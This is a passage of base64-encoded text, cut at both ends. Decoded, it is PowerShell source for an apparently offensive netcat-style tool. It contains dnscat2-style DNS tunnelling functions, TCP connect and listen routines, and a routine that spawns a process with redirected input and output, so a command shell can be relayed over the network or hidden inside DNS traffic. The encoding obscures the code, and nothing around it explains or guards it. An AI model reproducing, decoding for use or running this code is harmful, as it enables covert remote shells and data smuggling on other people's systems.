9udGFpbnMoJyInKSl7cmV0dXJuIChbcmVnZXhdOjpNYXRjaCgkcmVzdWx0LnJlcGxhY2UoImJpbz0iLCIiKSwnKD88PSIpW14iXSooPz0iKScpLlZhbHVlKX0NCiAgICAgIGVsc2V7cmV0dXJuIDF9DQogICAgfQ0KICAgIA0KICAgIGZ1bmN0aW9uIENyZWF0ZV9TWU4NCiAgICB7DQogICAgICBwYXJhbSgkU2Vzc2lvbklkLCRTZXFOdW0sJFRhZywkRG9tYWluKQ0KICAgICAgcmV0dXJuICgkVGFnICsgKFtzdHJpbmddKEdldC1SYW5kb20gLU1heGltdW0gOTk5OSAtTWluaW11bSAxMDAwKSkgKyAiMDAiICsgJFNlc3Npb25JZCArICRTZXFOdW0gKyAiMDAwMCIgKyAkRG9tYWluKQ0KICAgIH0NCiAgICANCiAgICBmdW5jdGlvbiBDcmVhdGVfRklODQogICAgew0KICAgICAgcGFyYW0oJFNlc3Npb25JZCwkVGFnLCREb21haW4pDQogICAgICByZXR1cm4gKCRUYWcgKyAoW3N0cmluZ10oR2V0LVJhbmRvbSAtTWF4aW11bSA5OTk5IC1NaW5pbXVtIDEwMDApKSArICIwMiIgKyAkU2Vzc2lvbklkICsgIjAwIiArICREb21haW4pDQogICAgfQ0KICAgIA0KICAgIGZ1bmN0aW9uIENyZWF0ZV9NU0cNCiAgICB7DQogICAgICBwYXJhbSgkU2Vzc2lvbklkLCRTZXFOdW0sJEFja25vd2xlZGdlbWVudE51bWJlciwkRGF0YSwkVGFnLCREb21haW4pDQogICAgICByZXR1cm4gKCRUYWcgKyAoW3N0cmluZ10oR2V0LVJhbmRvbSAtTWF4aW11bSA5OTk5IC1NaW5pbXVtIDEwMDApKSArICIwMSIgKyAkU2Vzc2lvbklkICsgJFNlcU51bSArICRBY2tub3dsZWRnZW1lbnROdW1iZXIgKyAkRGF0YSArICREb21haW4pDQogICAgfQ0KICAgIA0KICAgIGZ1bmN0aW9uIERlY29kZVBhY2tldA0KICAgIHsNCiAgICAgIHBhcmFtKCRQYWNrZXQpDQogICAgICANCiAgICAgIGlmKCgoJFBhY2tldC5MZW5ndGgpJTIgLWVxIDEpIC1vciAoJFBhY2tldC5MZW5ndGggLWVxIDApKXtyZXR1cm4gMX0NCiAgICAgICRBY2tub3dsZWRnZW1lbnROdW1iZXIgPSAoJFBhY2tldFsxMC4uMTNdIC1qb2luICIiKQ0KICAgICAgJFNlcU51bSA9ICgkUGFja2V0WzE0Li4xN10gLWpvaW4gIiIpDQogICAgICBbYnl0ZVtdXSRSZXR1cm5pbmdEYXRhID0gQCgpDQogICAgICANCiAgICAgIGlmKCRQYWNrZXQuTGVuZ3RoIC1ndCAxOCkNCiAgICAgIHsNCiAgICAgICAgJFBhY2tldEVsaW0gPSAkUGFja2V0LlN1YnN0cmluZygxOCkNCiAgICAgICAgd2hpbGUoJFBhY2tldEVsaW0uTGVuZ3RoIC1ndCAwKQ0KICAgICAgICB7DQogICAgICAgICAgJFJldHVybmluZ0RhdGEgKz0gW2J5dGVbXV1bQ29udmVydF06OlRvSW50MTYoKCRQYWNrZXRFbGltWzAuLjFdIC1qb2luICIiKSwxNikNCiAgICAgICAgICAkUGFja2V0RWxpbSA9ICRQYWNrZXRFbGltLlN1YnN0cmluZygyKQ0KICAgICAgICB9DQogICAgICB9DQogICAgICANCiAgICAgIHJldHVybiAkUGFja2V0LCRSZXR1cm5pbmdEYXRhLCRBY2tub3dsZWRnZW1lbnROdW1iZXIsJFNlcU51bQ0KICAgIH0NCiAgICANCiAgICBmdW5jdGlvbiBBY2tub3dsZWRnZURhdGENCiAgICB7DQogICAgICBwYXJhbSgkUmV0dXJuaW5nRGF0YSwkQWNrbm93bGVkZ2VtZW50TnVtYmVyKQ0KICAgICAgJEhleCA9IFtzdHJpbmddKCJ7MDp4fSIgLWYgKChbdWludDE2XSgiMHgiICsgJEFja25vd2xlZGdlbWVudE51bWJlcikgKyAkUmV0dXJuaW5nRGF0YS5MZW5ndGgpICUgNjU1MzUpKQ0KICAgICAgaWYoJEhleC5MZW5ndGggLW5lIDQpeyRIZXggPSAoKCIwIiooNC0kSGV4Lkxlbmd0aCkpICsgJEhleCl9DQogICAgICByZXR1cm4gJEhleA0KICAgIH0NCiAgICAkRnVuY1ZhcnMgPSBAe30NCiAgICAkRnVuY1ZhcnNbIkROU1NlcnZlciJdLCRGdW5jVmFyc1siRE5TUG9ydCJdLCRGdW5jVmFyc1siRG9tYWluIl0sJEZ1bmNWYXJzWyJGYWlsdXJlVGhyZXNob2xkIl0gPSAkRnVuY1NldHVwVmFycw0KICAgIGlmKCRGdW5jVmFyc1siRE5TUG9ydCJdIC1lcSAnJyl7JEZ1bmNWYXJzWyJETlNQb3J0Il0gPSAiNTMifQ0KICAgICRGdW5jVmFyc1siVGFnIl0gPSAiIg0KICAgICRGdW5jVmFyc1siRG9tYWluIl0gPSAoIi4iICsgJEZ1bmNWYXJzWyJEb21haW4iXSkNCiAgICANCiAgICAkRnVuY1ZhcnNbIkNyZWF0ZV9TWU4iXSA9ICR7ZnVuY3Rpb246Q3JlYXRlX1NZTn0NCiAgICAkRnVuY1ZhcnNbIkNyZWF0ZV9NU0ciXSA9ICR7ZnVuY3Rpb246Q3JlYXRlX01TR30NCiAgICAkRnVuY1ZhcnNbIkNyZWF0ZV9GSU4iXSA9ICR7ZnVuY3Rpb246Q3JlYXRlX0ZJTn0NCiAgICAkRnVuY1ZhcnNbIkRlY29kZVBhY2tldCJdID0gJHtmdW5jdGlvbjpEZWNvZGVQYWNrZXR9DQogICAgJEZ1bmNWYXJzWyJDb252ZXJ0VG8tSGV4QXJyYXkiXSA9ICR7ZnVuY3Rpb246Q29udmVydFRvLUhleEFycmF5fQ0KICAgICRGdW5jVmFyc1siQWNrRGF0YSJdID0gJHtmdW5jdGlvbjpBY2tub3dsZWRnZURhdGF9DQogICAgJEZ1bmNWYXJzWyJTZW5kUGFja2V0Il0gPSAke2Z1bmN0aW9uOlNlbmRQYWNrZXR9DQogICAgJEZ1bmNWYXJzWyJTZXNzaW9uSWQiXSA9IChbc3RyaW5nXShHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTAwMCkpDQogICAgJEZ1bmNWYXJzWyJTZXFOdW0iXSA9IChbc3RyaW5nXShHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTAwMCkpDQogICAgJEZ1bmNWYXJzWyJFbmNvZGluZyJdID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nDQogICAgJEZ1bmNWYXJzWyJGYWlsdXJlcyJdID0gMA0KICAgIA0KICAgICRTWU5QYWNrZXQgPSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJDcmVhdGVfU1lOIl0gLUFyZ3VtZW50TGlzdCBAKCRGdW5jVmFyc1siU2Vzc2lvbklkIl0sJEZ1bmNWYXJzWyJTZXFOdW0iXSwkRnVuY1ZhcnNbIlRhZyJdLCRGdW5jVmFyc1siRG9tYWluIl0pKQ0KICAgICRSZXNwb25zZVBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIlNlbmRQYWNrZXQiXSAtQXJndW1lbnRMaXN0IEAoJFNZTlBhY2tldCwkRnVuY1ZhcnNbIkROU1NlcnZlciJdLCRGdW5jVmFyc1siRE5TUG9ydCJdKSkNCiAgICAkRGVjb2RlZFBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkRlY29kZVBhY2tldCJdIC1Bcmd1bWVudExpc3QgQCgkUmVzcG9uc2VQYWNrZXQpKQ0KICAgIGlmKCREZWNvZGVkUGFja2V0IC1lcSAxKXtyZXR1cm4gIkJhZCBTWU4gcmVzcG9uc2UuIEVuc3VyZSB5b3VyIHNlcnZlciBpcyBzZXQgdXAgY29ycmVjdGx5LiJ9DQogICAgJFJldHVybmluZ0RhdGEgPSAkRGVjb2RlZFBhY2tldFsxXQ0KICAgIGlmKCRSZXR1cm5pbmdEYXRhIC1uZSAiIil7JEZ1bmNWYXJzWyJJbnB1dERhdGEiXSA9ICIifQ0KICAgICRGdW5jVmFyc1siQWNrTnVtIl0gPSAkRGVjb2RlZFBhY2tldFsyXQ0KICAgICRGdW5jVmFyc1siTWF4TVNHRGF0YVNpemUiXSA9ICgyNDQgLSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJDcmVhdGVfTVNHIl0gLUFyZ3VtZW50TGlzdCBAKCRGdW5jVmFyc1siU2Vzc2lvbklkIl0sJEZ1bmNWYXJzWyJTZXFOdW0iXSwkRnVuY1ZhcnNbIkFja051bSJdLCIiLCRGdW5jVmFyc1siVGFnIl0sJEZ1bmNWYXJzWyJEb21haW4iXSkpLkxlbmd0aCkNCiAgICBpZigkRnVuY1ZhcnNbIk1heE1TR0RhdGFTaXplIl0gLWxlIDApe3JldHVybiAiRG9tYWluIG5hbWUgaXMgdG9vIGxvbmcuIn0NCiAgICByZXR1cm4gJEZ1bmNWYXJzDQogIH0NCiAgZnVuY3Rpb24gUmVhZERhdGFfRE5TDQogIHsNCiAgICBwYXJhbSgkRnVuY1ZhcnMpDQogICAgaWYoJGdsb2JhbDpWZXJib3NlKXskVmVyYm9zZSA9ICRUcnVlfQ0KICAgIA0KICAgICRQYWNrZXRzRGF0YSA9IEAoKQ0KICAgICRQYWNrZXREYXRhID0gIiINCiAgICANCiAgICBpZigkRnVuY1ZhcnNbIklucHV0RGF0YSJdIC1uZSAkbnVsbCkNCiAgICB7DQogICAgICAkSGV4ID0gKEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siQ29udmVydFRvLUhleEFycmF5Il0gLUFyZ3VtZW50TGlzdCBAKCRGdW5jVmFyc1siSW5wdXREYXRhIl0pKQ0KICAgICAgJFNlY3Rpb25Db3VudCA9IDANCiAgICAgICRQYWNrZXRDb3VudCA9IDANCiAgICAgIGZvcmVhY2goJENoYXIgaW4gJEhleCkNCiAgICAgIHsNCiAgICAgICAgaWYoJFNlY3Rpb25Db3VudCAtZ2UgMzApDQogICAgICAgIHsNCiAgICAgICAgICAkU2VjdGlvbkNvdW50ID0gMA0KICAgICAgICAgICRQYWNrZXREYXRhICs9ICIuIg0KICAgICAgICB9DQogICAgICAgIGlmKCRQYWNrZXRDb3VudCAtZ2UgKCRGdW5jVmFyc1siTWF4TVNHRGF0YVNpemUiXSkpDQogICAgICAgIHsNCiAgICAgICAgICAkUGFja2V0c0RhdGEgKz0gJFBhY2tldERhdGEuVHJpbUVuZCgiLiIpDQogICAgICAgICAgJFBhY2tldENvdW50ID0gMA0KICAgICAgICAgICRTZWN0aW9uQ291bnQgPSAwDQogICAgICAgICAgJFBhY2tldERhdGEgPSAiIg0KICAgICAgICB9DQogICAgICAgICRQYWNrZXREYXRhICs9ICRDaGFyDQogICAgICAgICRTZWN0aW9uQ291bnQgKz0gMg0KICAgICAgICAkUGFja2V0Q291bnQgKz0gMg0KICAgICAgfQ0KICAgICAgJFBhY2tldERhdGEgPSAkUGFja2V0RGF0YS5UcmltRW5kKCIuIikNCiAgICAgICRQYWNrZXRzRGF0YSArPSAkUGFja2V0RGF0YQ0KICAgICAgJEZ1bmNWYXJzWyJJbnB1dERhdGEiXSA9ICIiDQogICAgfQ0KICAgIGVsc2UNCiAgICB7DQogICAgICAkUGFja2V0c0RhdGEgPSBAKCIiKQ0KICAgIH0NCiAgICANCiAgICBbYnl0ZVtdXSRSZXR1cm5pbmdEYXRhID0gQCgpDQogICAgZm9yZWFjaCgkUGFja2V0RGF0YSBpbiAkUGFja2V0c0RhdGEpDQogICAgew0KICAgICAgdHJ5eyRNU0dQYWNrZXQgPSBJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkNyZWF0ZV9NU0ciXSAtQXJndW1lbnRMaXN0IEAoJEZ1bmNWYXJzWyJTZXNzaW9uSWQiXSwkRnVuY1ZhcnNbIlNlcU51bSJdLCRGdW5jVmFyc1siQWNrTnVtIl0sJFBhY2tldERhdGEsJEZ1bmNWYXJzWyJUYWciXSwkRnVuY1ZhcnNbIkRvbWFpbiJdKX0NCiAgICAgIGNhdGNoeyBXcml0ZS1WZXJib3NlICJETlNDQVQyOiBGYWlsZWQgdG8gY3JlYXRlIHBhY2tldC4iIDsgJEZ1bmNWYXJzWyJGYWlsdXJlcyJdICs9IDEgOyBjb250aW51ZSB9DQogICAgICB0cnl7JFBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIlNlbmRQYWNrZXQiXSAtQXJndW1lbnRMaXN0IEAoJE1TR1BhY2tldCwkRnVuY1ZhcnNbIkROU1NlcnZlciJdLCRGdW5jVmFyc1siRE5TUG9ydCJdKSl9DQogICAgICBjYXRjaHsgV3JpdGUtVmVyYm9zZSAiRE5TQ0FUMjogRmFpbGVkIHRvIHNlbmQgcGFja2V0LiIgOyAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gKz0gMSA7IGNvbnRpbnVlIH0NCiAgICAgIHRyeQ0KICAgICAgew0KICAgICAgICAkRGVjb2RlZFBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkRlY29kZVBhY2tldCJdIC1Bcmd1bWVudExpc3QgQCgkUGFja2V0KSkNCiAgICAgICAgaWYoJERlY29kZWRQYWNrZXQuTGVuZ3RoIC1uZSA0KXsgV3JpdGUtVmVyYm9zZSAiRE5TQ0FUMjogRmFpbHVyZSB0byBkZWNvZGUgcGFja2V0LCBkcm9wcGluZy4uLiI7ICRGdW5jVmFyc1siRmFpbHVyZXMiXSArPSAxIDsgY29udGludWUgfQ0KICAgICAgICAkRnVuY1ZhcnNbIkFja051bSJdID0gJERlY29kZWRQYWNrZXRbMl0NCiAgICAgICAgJEZ1bmNWYXJzWyJTZXFOdW0iXSA9ICREZWNvZGVkUGFja2V0WzNdDQogICAgICAgICRSZXR1cm5pbmdEYXRhICs9ICREZWNvZGVkUGFja2V0WzFdDQogICAgICB9DQogICAgICBjYXRjaHsgV3JpdGUtVmVyYm9zZSAiRE5TQ0FUMjogRmFpbHVyZSB0byBkZWNvZGUgcGFja2V0LCBkcm9wcGluZy4uLiIgOyAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gKz0gMSA7IGNvbnRpbnVlIH0NCiAgICAgIGlmKCREZWNvZGVkUGFja2V0IC1lcSAxKXsgV3JpdGUtVmVyYm9zZSAiRE5TQ0FUMjogRmFpbHVyZSB0byBkZWNvZGUgcGFja2V0LCBkcm9wcGluZy4uLiIgOyAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gKz0gMSA7IGNvbnRpbnVlIH0NCiAgICB9DQogICAgDQogICAgaWYoJEZ1bmNWYXJzWyJGYWlsdXJlcyJdIC1nZSAkRnVuY1ZhcnNbIkZhaWx1cmVUaHJlc2hvbGQiXSl7YnJlYWt9DQogICAgDQogICAgaWYoJFJldHVybmluZ0RhdGEgLW5lIEAoKSkNCiAgICB7DQogICAgICAkRnVuY1ZhcnNbIkFja051bSJdID0gKEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siQWNrRGF0YSJdIC1Bcmd1bWVudExpc3QgQCgkUmV0dXJuaW5nRGF0YSwkRnVuY1ZhcnNbIkFja051bSJdKSkNCiAgICB9DQogICAgcmV0dXJuICRSZXR1cm5pbmdEYXRhLCRGdW5jVmFycw0KICB9DQogIGZ1bmN0aW9uIFdyaXRlRGF0YV9ETlMNCiAgew0KICAgIHBhcmFtKCREYXRhLCRGdW5jVmFycykNCiAgICAkRnVuY1ZhcnNbIklucHV0RGF0YSJdID0gJEZ1bmNWYXJzWyJFbmNvZGluZyJdLkdldFN0cmluZygkRGF0YSkNCiAgICByZXR1cm4gJEZ1bmNWYXJzDQogIH0NCiAgZnVuY3Rpb24gQ2xvc2VfRE5TDQogIHsNCiAgICBwYXJhbSgkRnVuY1ZhcnMpDQogICAgJEZJTlBhY2tldCA9IEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siQ3JlYXRlX0ZJTiJdIC1Bcmd1bWVudExpc3QgQCgkRnVuY1ZhcnNbIlNlc3Npb25JZCJdLCRGdW5jVmFyc1siVGFnIl0sJEZ1bmNWYXJzWyJEb21haW4iXSkNCiAgICBJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIlNlbmRQYWNrZXQiXSAtQXJndW1lbnRMaXN0IEAoJEZJTlBhY2tldCwkRnVuY1ZhcnNbIkROU1NlcnZlciJdLCRGdW5jVmFyc1siRE5TUG9ydCJdKSB8IE91dC1OdWxsDQogIH0NCiAgIyMjIyMjIyMjIyMjIyMjIEROUyBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjDQogIA0KICAjIyMjIyMjIyMjIFRDUCBGVU5DVElPTlMgIyMjIyMjIyMjIw0KICBmdW5jdGlvbiBTZXR1cF9UQ1ANCiAgew0KICAgIHBhcmFtKCRGdW5jU2V0dXBWYXJzKQ0KICAgICRjLCRsLCRwLCR0ID0gJEZ1bmNTZXR1cFZhcnMNCiAgICBpZigkZ2xvYmFsOlZlcmJvc2UpeyRWZXJib3NlID0gJFRydWV9DQogICAgJEZ1bmNWYXJzID0gQHt9DQogICAgaWYoISRsKQ0KICAgIHsNCiAgICAgICRGdW5jVmFyc1sibCJdID0gJEZhbHNlDQogICAgICAkU29ja2V0ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwQ2xpZW50DQogICAgICBXcml0ZS1WZXJib3NlICJDb25uZWN0aW5nLi4uIg0KICAgICAgJEhhbmRsZSA9ICRTb2NrZXQuQmVnaW5Db25uZWN0KCRjLCRwLCRudWxsLCRudWxsKQ0KICAgIH0NCiAgICBlbHNlDQogICAgew0KICAgICAgJEZ1bmNWYXJzWyJsIl0gPSAkVHJ1ZQ0KICAgICAgV3JpdGUtVmVyYm9zZSAoIkxpc3RlbmluZyBvbiBbMC4wLjAuMF0gKHBvcnQgIiArICRwICsgIikiKQ0KICAgICAgJFNvY2tldCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRjcExpc3RlbmVyICRwDQogICAgICAkU29ja2V0LlN0YXJ0KCkNCiAgICAgICRIYW5kbGUgPSAkU29ja2V0LkJlZ2luQWNjZXB0VGNwQ2xpZW50KCRudWxsLCAkbnVsbCkNCiAgICB9DQogICAgDQogICAgJFN0b3B3YXRjaCA9IFtTeXN0ZW0uRGlhZ25vc3RpY3MuU3RvcHdhdGNoXTo6U3RhcnROZXcoKQ0KICAgIHdoaWxlKCRUcnVlKQ0KICAgIHsNCiAgICAgIGlmKCRIb3N0LlVJLlJhd1VJLktleUF2YWlsYWJsZSkNCiAgICAgIHsNCiAgICAgICAgaWYoQCgxNywyNykgLWNvbnRhaW5zICgkSG9zdC5VSS5SYXdVSS5SZWFkS2V5KCJOb0VjaG8sSW5jbHVkZUtleURvd24iKS5WaXJ0dWFsS2V5Q29kZSkpDQogICAgICAgIHsNCiAgICAgICAgICBXcml0ZS1WZXJib3NlICJDVFJMIG9yIEVTQyBjYXVnaHQuIFN0b3BwaW5nIFRDUCBTZXR1cC4uLiINCiAgICAgICAgICBpZigkRnVuY1ZhcnNbImwiXSl7JFNvY2tldC5TdG9wKCl9DQogICAgICAgICAgZWxzZXskU29ja2V0LkNsb3NlKCl9DQogICAgICAgICAgJFN0b3B3YXRjaC5TdG9wKCkNCiAgICAgICAgICBicmVhaw0KICAgICAgICB9DQogICAgICB9DQogICAgICBpZigkU3RvcHdhdGNoLkVsYXBzZWQuVG90YWxTZWNvbmRzIC1ndCAkdCkNCiAgICAgIHsNCiAgICAgICAgaWYoISRsKXskU29ja2V0LkNsb3NlKCl9DQogICAgICAgIGVsc2V7JFNvY2tldC5TdG9wKCl9DQogICAgICAgICRTdG9wd2F0Y2guU3RvcCgpDQogICAgICAgIFdyaXRlLVZlcmJvc2UgIlRpbWVvdXQhIiA7IGJyZWFrDQogICAgICAgIGJyZWFrDQogICAgICB9DQogICAgICBpZigkSGFuZGxlLklzQ29tcGxldGVkKQ0KICAgICAgew0KICAgICAgICBpZighJGwpDQogICAgICAgIHsNCiAgICAgICAgICB0cnkNCiAgICAgICAgICB7DQogICAgICAgICAgICAkU29ja2V0LkVuZENvbm5lY3QoJEhhbmRsZSkNCiAgICAgICAgICAgICRTdHJlYW0gPSAkU29ja2V0LkdldFN0cmVhbSgpDQogICAgICAgICAgICAkQnVmZmVyU2l6ZSA9ICRTb2NrZXQuUmVjZWl2ZUJ1ZmZlclNpemUNCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgKCJDb25uZWN0aW9uIHRvICIgKyAkYyArICI6IiArICRwICsgIiBbdGNwXSBzdWNjZWVkZWQhIikNCiAgICAgICAgICB9DQogICAgICAgICAgY2F0Y2h7JFNvY2tldC5DbG9zZSgpOyAkU3RvcHdhdGNoLlN0b3AoKTsgYnJlYWt9DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgJENsaWVudCA9ICRTb2NrZXQuRW5kQWNjZXB0VGNwQ2xpZW50KCRIYW5kbGUpDQogICAgICAgICAgJFN0cmVhbSA9ICRDbGllbnQuR2V0U3RyZWFtKCkNCiAgICAgICAgICAkQnVmZmVyU2l6ZSA9ICRDbGllbnQuUmVjZWl2ZUJ1ZmZlclNpemUNCiAgICAgICAgICBXcml0ZS1WZXJib3NlICgiQ29ubmVjdGlvbiBmcm9tIFsiICsgJENsaWVudC5DbGllbnQuUmVtb3RlRW5kUG9pbnQuQWRkcmVzcy5JUEFkZHJlc3NUb1N0cmluZyArICJdIHBvcnQgIiArICRwb3J0ICsgIiBbdGNwXSBhY2NlcHRlZCAoc291cmNlIHBvcnQgIiArICRDbGllbnQuQ2xpZW50LlJlbW90ZUVuZFBvaW50LlBvcnQgKyAiKSIpDQogICAgICAgIH0NCiAgICAgICAgYnJlYWsNCiAgICAgIH0NCiAgICB9DQogICAgJFN0b3B3YXRjaC5TdG9wKCkNCiAgICBpZigkU29ja2V0IC1lcSAkbnVsbCl7YnJlYWt9DQogICAgJEZ1bmNWYXJzWyJTdHJlYW0iXSA9ICRTdHJlYW0NCiAgICAkRnVuY1ZhcnNbIlNvY2tldCJdID0gJFNvY2tldA0KICAgICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdID0gJEJ1ZmZlclNpemUNCiAgICAkRnVuY1ZhcnNbIlN0cmVhbURlc3RpbmF0aW9uQnVmZmVyIl0gPSAoTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdKQ0KICAgICRGdW5jVmFyc1siU3RyZWFtUmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJTdHJlYW0iXS5CZWdpblJlYWQoJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdLCAwLCAkRnVuY1ZhcnNbIkJ1ZmZlclNpemUiXSwgJG51bGwsICRudWxsKQ0KICAgICRGdW5jVmFyc1siRW5jb2RpbmciXSA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZw0KICAgICRGdW5jVmFyc1siU3RyZWFtQnl0ZXNSZWFkIl0gPSAxDQogICAgcmV0dXJuICRGdW5jVmFycw0KICB9DQogIGZ1bmN0aW9uIFJlYWREYXRhX1RDUA0KICB7DQogICAgcGFyYW0oJEZ1bmNWYXJzKQ0KICAgICREYXRhID0gJG51bGwNCiAgICBpZigkRnVuY1ZhcnNbIlN0cmVhbUJ5dGVzUmVhZCJdIC1lcSAwKXticmVha30NCiAgICBpZigkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXS5Jc0NvbXBsZXRlZCkNCiAgICB7DQogICAgICAkU3RyZWFtQnl0ZXNSZWFkID0gJEZ1bmNWYXJzWyJTdHJlYW0iXS5FbmRSZWFkKCRGdW5jVmFyc1siU3RyZWFtUmVhZE9wZXJhdGlvbiJdKQ0KICAgICAgaWYoJFN0cmVhbUJ5dGVzUmVhZCAtZXEgMCl7YnJlYWt9DQogICAgICAkRGF0YSA9ICRGdW5jVmFyc1siU3RyZWFtRGVzdGluYXRpb25CdWZmZXIiXVswLi4oW2ludF0kU3RyZWFtQnl0ZXNSZWFkLTEpXQ0KICAgICAgJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0gPSAkRnVuY1ZhcnNbIlN0cmVhbSJdLkJlZ2luUmVhZCgkRnVuY1ZhcnNbIlN0cmVhbURlc3RpbmF0aW9uQnVmZmVyIl0sIDAsICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdLCAkbnVsbCwgJG51bGwpDQogICAgfQ0KICAgIHJldHVybiAkRGF0YSwkRnVuY1ZhcnMNCiAgfQ0KICBmdW5jdGlvbiBXcml0ZURhdGFfVENQDQogIHsNCiAgICBwYXJhbSgkRGF0YSwkRnVuY1ZhcnMpDQogICAgJEZ1bmNWYXJzWyJTdHJlYW0iXS5Xcml0ZSgkRGF0YSwgMCwgJERhdGEuTGVuZ3RoKQ0KICAgIHJldHVybiAkRnVuY1ZhcnMNCiAgfQ0KICBmdW5jdGlvbiBDbG9zZV9UQ1ANCiAgew0KICAgIHBhcmFtKCRGdW5jVmFycykNCiAgICB0cnl7JEZ1bmNWYXJzWyJTdHJlYW0iXS5DbG9zZSgpfQ0KICAgIGNhdGNoe30NCiAgICBpZigkRnVuY1ZhcnNbImwiXSl7JEZ1bmNWYXJzWyJTb2NrZXQiXS5TdG9wKCl9DQogICAgZWxzZXskRnVuY1ZhcnNbIlNvY2tldCJdLkNsb3NlKCl9DQogIH0NCiAgIyMjIyMjIyMjIyBUQ1AgRlVOQ1RJT05TICMjIyMjIyMjIyMNCiAgDQogICMjIyMjIyMjIyMgQ01EIEZVTkNUSU9OUyAjIyMjIyMjIyMjDQogIGZ1bmN0aW9uIFNldHVwX0NNRA0KICB7DQogICAgcGFyYW0oJEZ1bmNTZXR1cFZhcnMpDQogICAgaWYoJGdsb2JhbDpWZXJib3NlKXskVmVyYm9zZSA9ICRUcnVlfQ0KICAgICRGdW5jVmFycyA9IEB7fQ0KICAgICRQcm9jZXNzU3RhcnRJbmZvID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbw0KICAgICRQcm9jZXNzU3RhcnRJbmZvLkZpbGVOYW1lID0gJEZ1bmNTZXR1cFZhcnNbMF0NCiAgICAkUHJvY2Vzc1N0YXJ0SW5mby5Vc2VTaGVsbEV4ZWN1dGUgPSAkRmFsc2UNCiAgICAkUHJvY2Vzc1N0YXJ0SW5mby5SZWRpcmVjdFN0YW5kYXJkSW5wdXQgPSAkVHJ1ZQ0KICAgICRQcm9jZXNzU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgPSAkVHJ1ZQ0KICAgICRQcm9jZXNzU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRFcnJvciA9ICRUcnVlDQogICAgJEZ1bmNWYXJzWyJQcm9jZXNzIl0gPSBbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpTdGFydCgkUHJvY2Vzc1N0YXJ0SW5mbykNCiAgICBXcml0ZS1WZXJib3NlICgiU3RhcnRpbmcgUHJvY2VzcyAiICsgJEZ1bmNTZXR1cFZhcnNbMF0gKyAiLi4uIikNCiAgICAkRnVuY1ZhcnNbIlByb2Nlc3MiXS5TdGFydCgpIHwgT3V0LU51bGwNCiAgICAkRnVuY1ZhcnNbIlN0ZE91dERlc3RpbmF0aW9uQnVmZmVyIl0gPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gNjU1MzYNCiAgICAkRnVuY1ZhcnNbIlN0ZE91dFJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkT3V0cHV0LkJhc2VTdHJlYW0uQmVnaW5SZWFkKCRGdW5jVmFyc1siU3RkT3V0RGVzdGluYXRpb25CdWZmZXIiXSwgMCwgNjU1MzYsICRudWxsLCAkbnVsbCkNCiAgICAkRnVuY1ZhcnNbIlN0ZEVyckRlc3RpbmF0aW9uQnVmZmVyIl0gPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gNjU1MzYNCiAgICAkRnVuY1ZhcnNbIlN0ZEVyclJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkRXJyb3IuQmFzZVN0cmVhbS5CZWdpblJlYWQoJEZ1bmNWYXJzWyJTdGRFcnJEZXN0aW5hdGlvbkJ1ZmZlciJdLCAwLCA2NTUzNiwgJG51bGwsICRudWxsKQ0KICAgICRGdW5jVmFyc1siRW5jb2RpbmciXSA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZw0KICAgIHJldHVybiAkRnVuY1ZhcnMNCiAgfQ0KICBmdW5jdGlvbiBSZWFkRGF0YV9DTUQNCiAgew0KICAgIHBhcmFtKCRGdW5jVmFycykNCiAgICBbYnl0ZVtdXSREYXRhID0gQCgpDQogICAgaWYoJEZ1bmNWYXJzWyJTdGRPdXRSZWFkT3BlcmF0aW9uIl0uSXNDb21wbGV0ZWQpDQogICAgew0KICAgICAgJFN0ZE91dEJ5dGVzUmVhZCA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkT3V0cHV0LkJhc2VTdHJlYW0uRW5kUmVhZCgkRnVuY1ZhcnNbIlN0ZE91dFJlYWRPcGVyYXRpb24iXSkN